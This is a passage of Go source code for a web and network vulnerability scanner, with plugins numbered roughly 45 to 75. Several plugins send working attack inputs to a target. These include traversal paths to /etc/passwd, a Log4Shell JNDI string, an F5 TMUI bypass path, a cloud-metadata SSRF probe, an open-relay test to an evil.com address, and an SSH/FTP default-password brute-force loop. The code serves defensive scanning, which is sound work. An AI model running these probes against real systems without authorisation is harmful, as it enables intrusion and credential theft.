		reqGet, _ := http.NewRequest("GET", getURL(target, testFileName), nil)
		respGet, err := getClient().Do(reqGet)

		if err == nil {
			defer respGet.Body.Close()

			// Read the content
			bodyBytes, _ := io.ReadAll(respGet.Body)
			uploadedContent := string(bodyBytes)

			// C) COMPARE
			// Does the server content match exactly what we sent?
			if strings.Contains(uploadedContent, testContent) {

				// D) CLEANUP (DELETE)
				// Be a polite scanner, remove the file.
				reqDel, _ := http.NewRequest("DELETE", getURL(target, testFileName), nil)
				getClient().Do(reqDel)

				return &Vulnerability{
					Target:      target,
					Name:        "Arbitrary File Upload (PUT)",
					Severity:    "CRITICAL", // Real upload confirmed, this is Critical.
					CVSS:        9.1,
					Description: fmt.Sprintf("Confirmed file upload via PUT method.\nFile: %s\nContent Verified: Yes", testFileName),
					Solution:    "Disable the PUT method or implement strict authentication/authorization.",
					Reference:   "CWE-434: Unrestricted Upload",
				}
			}
		}
	}

	return nil
}

// 46. JAVA DESERIALIZATION (Header Check)
type JavaDeserializationPlugin struct{}

func (p *JavaDeserializationPlugin) Name() string { return "Java Deserialization Risk" }
func (p *JavaDeserializationPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Usually found in JBoss, Jenkins etc.
	// We look for rO0AB (Base64 Java Object Magic Bytes) in Cookies or Headers.
	// This is a simple detection, not an active attack.
	resp, err := getClient().Get(getURL(target, "/"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		// Java serialized objects start with "rO0AB" (Base64)
		if strings.HasPrefix(cookie.Value, "rO0AB") {
			return &Vulnerability{
				Target: target, Name: "Java Serialized Object", Severity: "HIGH", CVSS: 8.1,
				Description: "Java object detected in Cookie. RCE risk.",
				Solution:    "Do not use insecure deserialization.",
				Reference:   "OWASP Deserialization",
			}
		}
	}
	return nil
}

// 47. NODE.JS PROTOTYPE POLLUTION - v2
type PrototypePollutionPlugin struct{}

func (p *PrototypePollutionPlugin) Name() string { return "Node.js Prototype Pollution" }
func (p *PrototypePollutionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "/")

	// Payload: Attempt to inject properties into Object.prototype
	// Detects if the server merges recursive JSON structures insecurely.
	payload := `{"__proto__":{"dorm_check": "polluted"}, "constructor": {"prototype": {"dorm_check": "polluted"}}}`

	req, _ := http.NewRequest("POST", baseURL, strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()

		// Logic: Check if the injected key is reflected in the response.
		// While reflection doesn't guarantee RCE, it strongly indicates
		// unsafe object merging (Prototype Pollution).

		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			bodyBytes, _ := io.ReadAll(resp.Body)

			// Check if our canary string 'dorm_check' appears in the response
			if strings.Contains(string(bodyBytes), "dorm_check") {
				return &Vulnerability{
					Target:      target,
					Name:        "Prototype Pollution Suspected",
					Severity:    "MEDIUM",
					CVSS:        6.5,
					Description: "Server accepts and reflects special keys (__proto__, constructor) in JSON body.",
					Solution:    "Implement strict JSON schema validation and freeze Object.prototype.",
					Reference:   "CWE-1321",
				}
			}
		}
	}
	return nil
}

// 48. DIRECTORY TRAVERSAL (DotDotPwn)
type TraversalPlugin struct{}

func (p *TraversalPlugin) Name() string { return "Directory Traversal" }
func (p *TraversalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try to reach /etc/passwd
	payloads := []string{"/../../../../etc/passwd", "/..%2f..%2f..%2f..%2fetc%2fpasswd", "/windows/win.ini"}

	for _, pay := range payloads {
		resp, err := getClient().Get(getURL(target, pay))
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 2048)
			resp.Body.Read(buf)
			content := string(buf)
			if strings.Contains(content, "root:x:0:0") || strings.Contains(content, "[fonts]") {
				return &Vulnerability{
					Target: target, Name: "Directory Traversal", Severity: "CRITICAL", CVSS: 9.3,
					Description: "System files are readable.",
					Solution:    "Sanitize file path inputs.",
					Reference:   "OWASP Path Traversal",
				}
			}
		}
	}
	return nil
}

// 49. CONFIG.JSON EXPOSURE
type ConfigJsonPlugin struct{}

func (p *ConfigJsonPlugin) Name() string { return "Config.json Disclosure" }
func (p *ConfigJsonPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Modern web app config files
	files := []string{"/config.json", "/app_config.json", "/settings.js"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			buf := make([]byte, 500)
			resp.Body.Read(buf)
			if strings.Contains(string(buf), "api_key") || strings.Contains(string(buf), "secret") || strings.Contains(string(buf), "db_host") {
				return &Vulnerability{
					Target: target, Name: "Config File Disclosure", Severity: "HIGH", CVSS: 7.5,
					Description: "Configuration file contains sensitive data.",
					Solution:    "Block access.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 50. IDOR / BROKEN ACCESS - V2.1 (SMART)
type IDORPlugin struct{}

func (p *IDORPlugin) Name() string { return "IDOR (Smart Pattern Check)" }

func (p *IDORPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	// IDOR olabilecek yaygın patternler
	patterns := []string{
		"/profile?id={ID}",
		"/users/{ID}",
		"/api/v1/user/{ID}",
		"/my-account?uid={ID}",
		"/order/view/{ID}",
		"/invoice?id={ID}",
		"/tickets/{ID}",
		"/messages/{ID}",
	}

	for _, pattern := range patterns {
		// 1. BASELINE (ID=1) - Genelde Admin veya ilk kullanıcı
		endpointBase := strings.Replace(pattern, "{ID}", "1", 1)
		respBase, err := client.Get(baseURL + endpointBase)
		if err != nil || respBase.StatusCode != 200 {
			continue
		}

		bodyBase, _ := io.ReadAll(respBase.Body)
		respBase.Body.Close()
		lenBase := len(bodyBase)

		// 2. TARGET (ID=2) - Başka bir kullanıcı
		endpointTarget := strings.Replace(pattern, "{ID}", "2", 1)
		respTarget, err := client.Get(baseURL + endpointTarget)

		if err == nil {
			defer respTarget.Body.Close()
			bodyTarget, _ := io.ReadAll(respTarget.Body)
			lenTarget := len(bodyTarget)

			// 3. NOISE CHECK (ID=99999) - Olmayan Sayfa
			endpointNoise := strings.Replace(pattern, "{ID}", "999999", 1)
			respNoise, _ := client.Get(baseURL + endpointNoise)
			lenNoise := 0
			if respNoise != nil {
				b, _ := io.ReadAll(respNoise.Body)
				lenNoise = len(b)
				respNoise.Body.Close()
			}

			// ANALİZ MANTIĞI:
			// ID=1 ve ID=2 farklı boyutlarda olmalı (Farklı kullanıcı) ama Hata sayfasından da farklı olmalı.
			isDifferentFromNoise := math.Abs(float64(lenTarget-lenNoise)) > float64(lenNoise)*0.1

			if respTarget.StatusCode == 200 && isDifferentFromNoise {
				return &Vulnerability{
					Target:      target,
					Name:        "Potential IDOR Found",
					Severity:    "HIGH",
					CVSS:        7.5,
					Description: fmt.Sprintf("Access to different user objects detected without auth error.\nEndpoint: %s\nID=1 Size: %d\nID=2 Size: %d\nID=999999 (Error) Size: %d", pattern, lenBase, lenTarget, lenNoise),
					Solution:    "Implement strict access controls checks for object IDs.",
					Reference:   "OWASP Broken Access Control",
				}
			}
		}
	}
	return nil
}

// ==========================================
// DORM v8: ELITE / ENTERPRISE PACK (51-70)
// ==========================================

// 51. LOG4SHELL (JNDI Injection - Header)
type Log4jPlugin struct{}

func (p *Log4jPlugin) Name() string { return "Log4Shell (CVE-2021-44228)" }
func (p *Log4jPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	payload := "${jndi:ldap://dorm-scanner-test/a}"
	req.Header.Set("User-Agent", payload)
	req.Header.Set("X-Api-Version", payload)

	resp, err := getClient().Do(req)
	if err == nil {
		defer resp.Body.Close()
		// If server crashes (500) or behaves oddly, it's suspicious.
		// (Note: Requires DNS callback for full confirmation, this is "passive" detection)
		if resp.StatusCode == 500 {
			return &Vulnerability{
				Target: target, Name: "Log4Shell Suspected", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Log4j payload caused server error.",
				Solution:    "Update Log4j library immediately.",
				Reference:   "CVE-2021-44228",
			}
		}
	}
	return nil
}

// 52. KUBERNETES KUBELET API (Unauth Access)
type KubeletPlugin struct{}

func (p *KubeletPlugin) Name() string { return "Kubernetes Kubelet API" }
func (p *KubeletPlugin) Run(target ScanTarget) *Vulnerability {
	// Kubelet usually runs on 10250
	if target.Port != 10250 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/pods"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		// If PodList returns, it's a disaster
		if strings.Contains(string(buf), "\"kind\":\"PodList\"") {
			return &Vulnerability{
				Target: target, Name: "Kubelet API Exposure", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Kubernetes pod list accessible without auth.",
				Solution:    "Disable Anonymous auth.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 53. DOCKER REGISTRY CATALOG
type DockerRegistryPlugin struct{}

func (p *DockerRegistryPlugin) Name() string { return "Docker Registry Exposure" }
func (p *DockerRegistryPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/v2/_catalog"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "repositories") {
			return &Vulnerability{
				Target: target, Name: "Open Docker Registry", Severity: "HIGH", CVSS: 7.5,
				Description: "Docker image list is public.",
				Solution:    "Enable Authentication.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 54. SPRING CLOUD GATEWAY RCE (CVE-2022-22947) - v2
type SpringCloudPlugin struct{}

func (p *SpringCloudPlugin) Name() string { return "Spring Cloud Gateway RCE (Verified)" }

func (p *SpringCloudPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	targetEndpoint := "/actuator/gateway/routes"
	fullURL := getURL(target, targetEndpoint)

	resp, err := client.Get(fullURL)
	if err == nil {
		defer resp.Body.Close()

		// Read response body for content verification (Fingerprinting)
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		if resp.StatusCode == 200 {
			if strings.Contains(bodyString, "\"predicate\"") && (strings.Contains(bodyString, "\"filters\"") || strings.Contains(bodyString, "\"route_id\"")) {
				return &Vulnerability{
					Target:      target,
					Name:        "Spring Cloud Gateway RCE (Exposed Actuator)",
					Severity:    "CRITICAL",
					CVSS:        10.0, // CVE-2022-22947 is max severity
					Description: "Spring Cloud Gateway Actuator endpoint is exposed and unauthenticated.\nVerified Signature: Valid Route JSON structure detected.",
					Solution:    "Disable the gateway actuator endpoint (`management.endpoint.gateway.enabled=false`) or secure it with authentication.",
					Reference:   "CVE-2022-22947",
				}
			}
		}
	}
	return nil
}

// 55. F5 BIG-IP TMUI RCE (CVE-2020-5902) - Verified
type F5BigIPPlugin struct{}

func (p *F5BigIPPlugin) Name() string { return "F5 BIG-IP TMUI RCE (CVE-2020-5902)" }

func (p *F5BigIPPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	targetPath := "/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/tmui/WEB-INF"
	fullURL := getURL(target, targetPath)

	resp, err := client.Get(fullURL)
	if err == nil {
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		if resp.StatusCode == 200 {
			if strings.Contains(bodyString, "web.xml") || strings.Contains(bodyString, "struts-config.xml") {
				return &Vulnerability{
					Target:      target,
					Name:        "F5 BIG-IP TMUI RCE (Verified)",
					Severity:    "CRITICAL",
					CVSS:        9.8,
					Description: "Authentication bypass successful. Internal system files listed via TMUI interface.",
					Solution:    "Apply F5 security patches immediately or restrict access to the TMUI utility.",
					Reference:   "CVE-2020-5902",
				}
			}
		}
	}
	return nil
}

// 56. JENKINS SCRIPT CONSOLE
type JenkinsPlugin struct{}

func (p *JenkinsPlugin) Name() string { return "Jenkins Script Console" }
func (p *JenkinsPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/script"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "println") || strings.Contains(string(buf), "Groovy") {
			return &Vulnerability{
				Target: target, Name: "Jenkins Script Console Open", Severity: "CRITICAL", CVSS: 9.8,
				Description: "Unauthenticated RCE panel found.",
				Solution:    "Secure Jenkins with password.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 57. REDIS UNAUTH (TCP)
type RedisPlugin struct{}

func (p *RedisPlugin) Name() string { return "Redis Unauthorized Access" }
func (p *RedisPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 6379 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Send PING command
	conn.Write([]byte("PING\r\n"))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "PONG") {
		return &Vulnerability{
			Target: target, Name: "Unprotected Redis Server", Severity: "CRITICAL", CVSS: 9.0,
			Description: "Redis server has no password, DB can be stolen.",
			Solution:    "Use 'requirepass' directive.",
			Reference:   "",
		}
	}
	return nil
}

// 58. MONGODB NO-AUTH (TCP)
type MongoPlugin struct{}

func (p *MongoPlugin) Name() string { return "MongoDB Unauthorized Access" }
func (p *MongoPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 27017 {
		return nil
	}
	// Hard to simulate full Mongo wire protocol, basic connection test
	// If connection is established, there is risk.
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	return &Vulnerability{
		Target: target, Name: "Open MongoDB Port", Severity: "MEDIUM", CVSS: 5.0,
		Description: "Port 27017 is open, check auth.",
		Solution:    "Restrict via IP whitelist.",
		Reference:   "",
	}
}

// 59. ELASTICSEARCH INFO LEAK
type ElasticPlugin struct{}

func (p *ElasticPlugin) Name() string { return "Elasticsearch Disclosure" }
func (p *ElasticPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 9200 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/_cat/indices?v"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "health") && strings.Contains(string(buf), "index") {
			return &Vulnerability{
				Target: target, Name: "Elasticsearch Data Leak", Severity: "HIGH", CVSS: 7.5,
				Description: "Index list visible without auth.",
				Solution:    "Enable X-Pack Security.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 60. MEMCACHED STATS UDP/TCP
type MemcachedPlugin struct{}

func (p *MemcachedPlugin) Name() string { return "Memcached Stats" }
func (p *MemcachedPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 11211 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.Write([]byte("stats\r\n"))
	buf := make([]byte, 2048)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "STAT pid") {
		return &Vulnerability{
			Target: target, Name: "Memcached Info Disclosure", Severity: "MEDIUM", CVSS: 5.0,
			Description: "Stats command enabled, can be used for DDoS.",
			Solution:    "Disable UDP, listen only on localhost.",
			Reference:   "",
		}
	}
	return nil
}

// 61. ANONYMOUS FTP
type FTPAnonPlugin struct{}

func (p *FTPAnonPlugin) Name() string { return "Anonymous FTP" }
func (p *FTPAnonPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 21 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Read Banner
	buf := make([]byte, 1024)
	conn.Read(buf)

	// Send USER anonymous
	conn.Write([]byte("USER anonymous\r\n"))
	conn.Read(buf)
	conn.Write([]byte("PASS anonymous@dorm.com\r\n"))
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "230") { // 230 Login successful
		return &Vulnerability{
			Target: target, Name: "FTP Anonymous Login", Severity: "HIGH", CVSS: 7.5,
			Description: "FTP login allowed without password.",
			Solution:    "Disable anonymous access.",
			Reference:   "",
		}
	}
	return nil
}

// 62. SMTP OPEN RELAY
type SMTPRelayPlugin struct{}

func (p *SMTPRelayPlugin) Name() string { return "SMTP Open Relay" }
func (p *SMTPRelayPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 25 && target.Port != 587 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Basic handshake
	buf := make([]byte, 1024)
	conn.Read(buf)
	conn.Write([]byte("HELO dorm.com\r\n"))
	conn.Read(buf)
	conn.Write([]byte("MAIL FROM:<test@dorm.com>\r\n"))
	conn.Read(buf)
	// Can we send mail out?
	conn.Write([]byte("RCPT TO:<victim@evil.com>\r\n"))
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "250") { // 250 OK means relay open
		return &Vulnerability{
			Target: target, Name: "SMTP Open Relay", Severity: "CRITICAL", CVSS: 9.0,
			Description: "Server can be used to send spam.",
			Solution:    "Configure relay restrictions.",
			Reference:   "",
		}
	}
	return nil
}

// 63. API KEY LEAK (JS SCAN)
type APIKeyPlugin struct{}

func (p *APIKeyPlugin) Name() string { return "API Key in JS Files" }
func (p *APIKeyPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Get main page
	resp, err := getClient().Get(getURL(target, "/"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	// Regex for AWS or Google Key (Simplified)
	if strings.Contains(body, "AKIA") && len(body) > 20 { // AWS Key ID prefix
		return &Vulnerability{
			Target: target, Name: "AWS API Key Leak", Severity: "CRITICAL", CVSS: 9.5,
			Description: "AWS key starting with 'AKIA' found in source code.",
			Solution:    "Rotate and delete the key.",
			Reference:   "",
		}
	}
	if strings.Contains(body, "AIza") { // Google API Key prefix
		return &Vulnerability{
			Target: target, Name: "Google API Key Leak", Severity: "MEDIUM", CVSS: 5.0,
			Description: "Google API key found in source code.",
			Solution:    "Restrict key usage.",
			Reference:   "",
		}
	}
	return nil
}

// 64. SUBDOMAIN TAKEOVER (CNAME)
type TakeoverPlugin struct{}

func (p *TakeoverPlugin) Name() string { return "Subdomain Takeover Risk" }
func (p *TakeoverPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Look for specific cloud provider errors in 404 pages
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil {
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		body := string(bodyBytes)

		signatures := []string{
			"There is no app configured at that hostname", // Heroku
			"NoSuchBucket", // AWS S3
			"The specified bucket does not exist",
			"Fastly error: unknown domain", // Fastly
		}

		for _, sig := range signatures {
			if strings.Contains(body, sig) {
				return &Vulnerability{
					Target: target, Name: "Subdomain Takeover", Severity: "HIGH", CVSS: 8.0,
					Description: "Domain points to an unclaimed cloud resource.",
					Solution:    "Delete DNS record or claim resource.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 65. ASP.NET VIEWSTATE (Unencrypted)
type ViewStatePlugin struct{}

func (p *ViewStatePlugin) Name() string { return "ASP.NET ViewState Encryption" }
func (p *ViewStatePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil {
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		body := string(bodyBytes)
		// Check for ViewState
		if strings.Contains(body, "__VIEWSTATE") {
			// If MAC (Message Authentication Code) is missing, it's dangerous
			if !strings.Contains(body, "mac=") && !strings.Contains(body, "__VIEWSTATEGENERATOR") {
				return &Vulnerability{
					Target: target, Name: "Unencrypted ViewState", Severity: "MEDIUM", CVSS: 5.5,
					Description: "ASP.NET ViewState is not encrypted or signed.",
					Solution:    "Add validation='SHA1' to machineKey config.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 66. LARAVEL .ENV
type LaravelEnvPlugin struct{}

func (p *LaravelEnvPlugin) Name() string { return "Laravel .env Disclosure" }
func (p *LaravelEnvPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.env"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "APP_KEY=") {
			return &Vulnerability{
				Target: target, Name: "Laravel .env Disclosure", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Application keys and DB passwords exposed.",
				Solution:    "Block access to .env file.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 67. COLDFUSION DEBUGGING
type ColdFusionPlugin struct{}

func (p *ColdFusionPlugin) Name() string { return "ColdFusion Debugging" }
func (p *ColdFusionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/CFIDE/debug/cf_debug.cfm"))
	if err == nil && resp.StatusCode == 200 {
		return &Vulnerability{
			Target: target, Name: "ColdFusion Debug Mode", Severity: "HIGH", CVSS: 7.5,
			Description: "ColdFusion debug interface exposed.",
			Solution:    "Restrict CFIDE folder.",
			Reference:   "",
		}
	}
	return nil
}

// 68. DRUPALGEDDON2 (CVE-2018-7600)
type DrupalPlugin struct{}

func (p *DrupalPlugin) Name() string { return "Drupalgeddon2 RCE" }
func (p *DrupalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Only check version/path, not sending payload
	resp, err := getClient().Get(getURL(target, "/CHANGELOG.txt"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "Drupal 7.") {
			return &Vulnerability{
				Target: target, Name: "Outdated Drupal Version", Severity: "MEDIUM", CVSS: 6.0,
				Description: "Old Drupal version detected, possible Drupalgeddon risk.",
				Solution:    "Update Drupal.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 69. EXPOSED GITLAB USER ENUM
type GitLabPlugin struct{}

func (p *GitLabPlugin) Name() string { return "GitLab User Enum" }
func (p *GitLabPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/api/v4/users?per_page=1"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "\"username\":") {
			return &Vulnerability{
				Target: target, Name: "GitLab API Exposed", Severity: "MEDIUM", CVSS: 5.3,
				Description: "GitLab user list accessible via public API.",
				Solution:    "Restrict public API access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 70. NGINX ALIAS TRAVERSAL (Off-by-slash)
type NginxTraversalPlugin struct{}

func (p *NginxTraversalPlugin) Name() string { return "Nginx Alias Traversal" }
func (p *NginxTraversalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Tests for config errors like /static/../
	resp, err := getClient().Get(getURL(target, "/static../"))
	if err == nil {
		defer resp.Body.Close()
		// If directory listing or path error returns
		if resp.StatusCode == 200 || resp.StatusCode == 403 { // Sometimes 403 proves existence
			// Simple check, might be False Positive but worth investigating
			return nil
		}
	}
	return nil
}

// 71. DOM XSS & SPA SCANNER (HEADLESS CHROME)
type DOMScannerPlugin struct{}

func (p *DOMScannerPlugin) Name() string { return "DOM XSS & SPA Scanner (Chrome)" }
func (p *DOMScannerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Context for starting Chrome
	// Runs in headless mode (no window)
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
	)

	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	// 15 Second timeout (Browsers are slow, let's not wait forever)
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()
	ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	// DOM XSS Test: Trying payload via URL Fragment (#)
	// Modern SPA sites (React/Vue) route based on this data.
	payload := "dorm_xss_check"
	targetURL := getURL(target, "/#"+payload)

	var res string
	// Command Chrome: Go, Wait, Dump HTML
	err := chromedp.Run(ctx,
		chromedp.Navigate(targetURL),
		// Wait until body loads (SPA render time)
		chromedp.WaitVisible("body", chromedp.ByQuery),
		// Get rendered HTML (OuterHTML)
		chromedp.OuterHTML("html", &res),
	)

	if err != nil {
		// Exit silently if browser fails or times out
		return nil
	}

	if strings.Contains(res, payload) {
		return &Vulnerability{
			Target:      target,
			Name:        "DOM Based XSS / Reflected",
			Severity:    "HIGH",
			CVSS:        7.2,
			Description: "Payload detected in DOM after JavaScript rendering (SPA Vulnerability).",
			Solution:    "Sanitize user inputs in JavaScript.",
			Reference:   "OWASP DOM XSS",
		}
	}
	return nil
}

// 73. (SSH & FTP BRUTE FORCE)
type BruteForcePlugin struct{}

func (p *BruteForcePlugin) Name() string { return "Mini-Hydra (SSH/FTP Brute Force)" }

func (p *BruteForcePlugin) Run(target ScanTarget) *Vulnerability {
	// Only works on SSH (22) and FTP (21)
	if target.Port != 22 && target.Port != 21 {
		return nil
	}

	creds := []struct{ User, Pass string }{
		{"root", "root"},
		{"admin", "admin"},
		{"root", "toor"},
		{"user", "user"},
		{"admin", "password"},
		{"root", "123456"},
		{"administrator", "password"},
		{"ubuntu", "ubuntu"}, // For AWS machines
		{"pi", "raspberry"},  // For Raspberry Pi
		{"vagrant", "vagrant"},
	}

	foundCreds := ""

	// --- FTP ATTACK (PORT 21) ---
	if target.Port == 21 {
		for _, c := range creds {
			conn, err := ftp.Dial(fmt.Sprintf("%s:%d", target.IP, target.Port), ftp.DialWithTimeout(2*time.Second))
			if err == nil {
				err = conn.Login(c.User, c.Pass)
				if err == nil {

					foundCreds = fmt.Sprintf("FTP Cracked! User: '%s' Pass: '%s'", c.User, c.Pass)
					conn.Logout()
					conn.Quit()
					break // Found it, no need to force more
				}
				conn.Quit()
			}
			// Tiny sleep to avoid choking the server
			// time.Sleep(100 * time.Millisecond)
		}
	}

	// --- SSH ATTACK (PORT 22) ---
	if target.Port == 22 {
		for _, c := range creds {
			config := &ssh.ClientConfig{
				User: c.User,
				Auth: []ssh.AuthMethod{
					ssh.Password(c.Pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Skip host key check
				Timeout:         2 * time.Second,
			}

			// Try connection
			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), config)
			if err == nil {

				foundCreds = fmt.Sprintf("SSH Cracked! User: '%s' Pass: '%s'", c.User, c.Pass)
				client.Close()
				break
			}
		}
	}

	// Report if cracked
	if foundCreds != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "Critical Access: Default Password (Brute-Force)",
			Severity:    "CRITICAL",
			CVSS:        10.0,
			Description: "Logged in with default/weak password: " + foundCreds,
			Solution:    "Change all default passwords immediately and use SSH key-based auth.",
			Reference:   "CWE-521: Weak Password Requirements",
		}
	}

	return nil
}

// 74. SSRF CLOUD METADATA - v2
type SSRFMetadataPlugin struct{}

func (p *SSRFMetadataPlugin) Name() string { return "SSRF Cloud Metadata (Pro)" }
func (p *SSRFMetadataPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	// AWS Metadata IP
	ssrfPayload := "http://169.254.169.254/latest/meta-data/"

	// Common parameters prone to SSRF
	params := []string{"url", "uri", "link", "dest", "redirect", "source", "file", "u", "r"}

	for _, param := range params {
		// Construct Payload: target.com/?url=http://169.254.169.254/...
		targetURL := fmt.Sprintf("%s/?%s=%s", getURL(target, ""), param, ssrfPayload)

		resp, err := client.Get(targetURL)
		if err == nil {
			bodyBytes, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			body := string(bodyBytes)

			// Check for AWS Metadata signature in response
			if resp.StatusCode == 200 && (strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "iam/security-credentials")) {
				return &Vulnerability{
					Target:      target,
					Name:        "Cloud SSRF (Metadata Leak)",
					Severity:    "CRITICAL",
					CVSS:        10.0,
					Description: fmt.Sprintf("Server fetched Cloud Metadata via parameter '%s'.\nThis exposes critical IAM credentials.", param),
					Solution:    "Disable access to 169.254.169.254 or enforce IMDSv2.",
					Reference:   "CWE-918 / Cloud Security",
				}
			}
		}
	}
	return nil
}

// 75. JWT WEAKNESS - V2
type JWTWeaknessPlugin struct{}

func (p *JWTWeaknessPlugin) Name() string { return "JWT None Algorithm Attack" }

